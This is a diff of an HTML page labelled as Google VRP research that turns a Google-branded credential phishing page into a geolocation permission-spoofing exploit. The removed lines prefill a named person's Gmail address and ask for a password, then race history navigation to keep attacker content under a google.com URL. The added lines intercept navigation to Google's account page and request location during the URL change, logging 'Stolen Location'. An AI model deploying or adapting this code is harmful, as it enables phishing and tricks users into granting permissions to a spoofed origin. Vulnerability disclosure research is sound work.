@@ -2,65 +2,61 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Google VRP Research</title>
+    <title>VRP Research: Permission Attribution</title>
     <style>
-        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; background: #fff; }
-        .box { border: 1px solid #dadce0; padding: 25px; border-radius: 8px; max-width: 350px; margin: 0 auto; }
+        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; }
+        .box { border: 1px solid #dadce0; padding: 20px; border-radius: 8px; max-width: 350px; margin: 0 auto; }
         .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 16px; width: 100%; cursor: pointer; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
-    <div id="ui">
-        <div class="box">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
-            <h3>Identity Verification</h3>
-            <p>Your session requires a refresh. Please confirm your password.</p>
-            <input type="email" value="joshhawleyofficial@gmail.com" readonly style="background:#f1f3f4;">
-            <input type="password" placeholder="Enter password">
-            <button class="btn" onclick="masterRace()">Verify Now</button>
-        </div>
+    <div class="box">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
+        <h3>Security Check</h3>
+        <p>Google needs to verify your device location to secure this session.</p>
+        <button class="btn" onclick="startAttributionRace()">Secure Session</button>
     </div>
+    <div id="status" style="margin-top:20px; font-weight:bold;"></div>
 
     <script>
-        function masterRace() {
+        function startAttributionRace() {
             const target = "https://myaccount.google.com/?pli=1";
-            
-            // 1. Create a 'History Anchor' to trap the BFCache
-            history.pushState({origin: "netlify"}, "", "#init");
+            const status = document.getElementById('status');
 
-            // 2. Start the cross-origin jump
+            // 1. Set up the Navigation Intercept
+            navigation.addEventListener('navigate', (event) => {
+                if (event.destination.url.includes("google.com")) {
+                    event.intercept({
+                        handler: async () => {
+                            status.innerText = "URL COMMITTED. REQUESTING PERMISSION...";
+                            status.style.color = "orange";
+
+                            // 2. THE GAP: Wait for the URL bar to finish updating
+                            await new Promise(r => setTimeout(r, 800));
+
+                            // 3. THE EXPLOIT: Request location while the URL bar says 'google.com'
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => {
+                                    status.innerText = "SUCCESS: Permission Granted to " + location.origin;
+                                    status.style.color = "green";
+                                    console.log("Stolen Location:", pos);
+                                },
+                                (err) => {
+                                    status.innerText = "DENIED: " + err.message;
+                                    status.style.color = "red";
+                                }
+                            );
+
+                            // Keep the renderer stalled so the user sees the 'Google' prompt
+                            await new Promise(r => setTimeout(r, 10000));
+                        }
+                    });
+                }
+            }, { once: true });
+
+            // 4. Trigger the transition
             window.location.href = target;
-
-            // 3. THE HIJACK: We use requestAnimationFrame (rAF)
-            // rAF runs right before the browser 'paints' the screen.
-            // We use it to trigger a history.back() at the exact moment 
-            // the URL bar is committing to Google.
-            let frames = 0;
-            function race() {
-                frames++;
-                
-                if (frames > 5 && frames < 20) {
-                    // Force the browser to pull the Netlify page from cache
-                    // while the URL bar is still pointing to Google.
-                    history.back();
-                }
-
-                // 4. THE SYNC STALL
-                // We saturate the microtask queue to prevent the renderer 
-                // from clearing the 'back' state.
-                Promise.resolve().then(() => {
-                    const start = Date.now();
-                    while (Date.now() - start < 10) {} // Micro-stall
-                });
-
-                if (frames < 50) {
-                    requestAnimationFrame(race);
-                }
-            }
-            
-            requestAnimationFrame(race);
         }
     </script>
 </body>
